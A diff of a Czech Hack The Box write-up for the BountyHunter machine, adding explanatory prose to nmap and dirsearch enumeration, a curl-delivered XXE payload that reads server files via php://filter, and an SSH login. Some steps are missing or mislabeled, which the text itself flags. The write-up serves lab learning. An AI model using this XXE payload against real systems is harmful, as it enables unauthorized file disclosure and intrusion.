@@ -5,18 +5,29 @@ title: "BountyHunter"
 date: 2020-11-11
 tags: linux rce ssh sudo php exploit
 ---
-[BountyHunter](https://www.hackthebox.com/home/machines/profile/359) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.
+
+## Úvod a kontext
+
+BountyHunter je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
+```
 ```
 PORT   STATE SERVICE VERSION
 ```
 
-### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)`
+### Detailní analýza služeb
+
+V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+```
 ```
 | ssh-hostkey:
 |   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
@@ -32,8 +43,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Enumerace webu
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
+```
 ```
 [17:55:44] Starting:
 [17:56:00] 301 -  313B  - /assets  ->  http://10.10.11.100/assets/     (Added to queue)
@@ -46,9 +60,14 @@ Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní strá
 [17:56:14] 200 -    3KB - /resources/
 ```
 
+## Získání přístupu
+
 ### Spuštění exploitu
-Zde dochází k praktickému zneužití zranitelnosti.
-`http://10.10.11.100/resources/README.txt`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```text
+http://10.10.11.100/resources/README.txt
+```
 ```
 Tasks:
 
@@ -59,8 +78,11 @@ Tasks:
 ```
 
 ### Spuštění exploitu (2)
-Zde dochází k praktickému zneužití zranitelnosti.
-`curl -v 'http://10.10.11.100/tracker_diRbPr00f314.php' --data-urlencode "data=$(echo '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE bugreport [<!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php">]><bugreport><title>aa</title><cwe>aa</cwe><cvss>aa</cvss><reward>&harmless;</reward></bugreport>' | base64 -w 0)"`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```bash
+curl -v 'http://10.10.11.100/tracker_diRbPr00f314.php' --data-urlencode "data=$(echo '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE bugreport [<!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php">]><bugreport><title>aa</title><cwe>aa</cwe><cvss>aa</cvss><reward>&harmless;</reward></bugreport>' | base64 -w 0)"
+```
 ```
 <?php
 
@@ -94,8 +116,11 @@ If DB were ready, would have added:
 ```
 
 ### Přihlášení na cíl (2)
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`ssh development@10.10.11.100`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+ssh development@10.10.11.100
+```
 ```
 ## cat user.txt
 __CENSORED__
@@ -111,9 +136,14 @@ __CENSORED__
 ## /tmp/shell.md
 ```
 
+## Eskalace oprávnění
+
 ### Získání root flagu
-Tímto potvrzuji úplné ovládnutí stroje.
-`Skytrain Inc`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```text
+Skytrain Inc
+```
 ```
 ## Ticket to New Haven
 __Ticket Code:__
@@ -128,5 +158,22 @@ __Ticket Code:__
 __CENSORED__
 ```
 
+## Získání přístupu
+
 ### Získání user flagu
-`TODO`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+
+[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro získání uživatelského přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+
+## Shrnutí klíčových poznatků
+
+- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
+- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
+- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.
+
+## Co si odnést do praxe
+
+- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
+- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
+- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
